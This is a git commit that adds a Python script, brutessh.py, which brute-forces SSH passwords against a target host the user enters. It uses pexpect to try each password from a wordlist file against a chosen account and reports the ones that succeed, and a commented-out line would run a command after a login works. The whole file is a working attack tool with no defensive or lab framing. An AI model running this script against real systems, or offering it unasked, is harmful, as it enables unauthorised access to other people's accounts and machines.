a18882428a5d0653ba1776bdaf9e1cf47cadae49
Paul Prawdzik <paulpraw@buffalo.edu>
2020-12-18 21:27:21 -0500

    Add files via upload

---
+++ ssh/brutessh.py
@@ -0,0 +1,43 @@
+#!/usr/bin/python
+
+import pexpect
+from termcolor import colored
+
+PROMPT = ['#', '>>>', '>', '\$' ]
+
+def send_command(child,command):
+        child.sendline(command)
+        child.expect(PROMPT)
+        print(child.before)
+
+def connect(user, host, password):
+        ssh_newkey = 'Are you sure you want to continue connecting'
+        connStr = 'ssh ' + user + '@' + host
+        child = pexpect.spawn(connStr)
+        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
+        if ret == 0:
+                print( '[-] Error Connecting')
+                return
+        if ret == 1:
+                child.sendline('yes')
+                ret = child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
+                if ret == 0:
+                        print( '[-] Error Connecting')
+                        return
+        child.sendline(password)
+        child.expect(PROMPT,timeout=0.5)
+        return child
+
+def main():
+	host = input("Enter IP address of target: ")
+	user = input("Enter user account to brute force: ")
+	file = open('passwords.txt', 'r')
+	for password in file.readlines():
+		password = password.strip('\n')
+		try:
+			child = connect(user, host, password)
+			print(colored('[+] Password Found: ' + password, 'green'))
+			#send_command(child, 'whoami')
+		except:
+			print(colored('[-] Incorrect Password ' + password, 'red'))
+main()
